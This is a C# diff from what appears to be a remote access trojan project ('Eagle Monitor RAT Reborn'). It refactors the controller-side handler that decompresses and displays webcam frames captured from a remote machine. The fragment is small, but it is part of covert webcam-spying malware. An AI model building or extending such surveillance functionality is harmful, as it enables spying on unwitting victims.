@@ -15,34 +15,20 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
     {
         public RemoteCameraCapturePacketHandler(RemoteCameraCapturePacket remoteCameraCapturePacket) : base()//, ClientHandler clientHandler)
         {
-            //TO TEST !!!!!
-
-            try
-            {
-                ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamPictureBox.BeginInvoke((MethodInvoker)(() =>
-                {
-                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamHandler.hasAlreadyConnected = true;
-                    if (ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture)) != null)
-                        ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
-                }));
-                return;
-            }
-            catch { }
-
-            /*new Thread(() =>
+            if (ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm != null)
             {
                 try
                 {
-                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.BeginInvoke((MethodInvoker)(() =>
+                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm.remoteWebCamPictureBox.BeginInvoke((MethodInvoker)(() =>
                     {
-                        ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamHandler.hasAlreadyConnected = true;
+                        ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm.RemoteWebCamHandler.HasAlreadyConnected = true;
                         if (ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture)) != null)
-                            ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].clientForm.remoteWebCamPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
+                            ClientHandler.ClientHandlersList[remoteCameraCapturePacket.BaseIp].ClientForm.remoteWebCamPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                     }));
                     return;
                 }
                 catch { }
-            }).Start();*/
+            }
         }
     }
 }
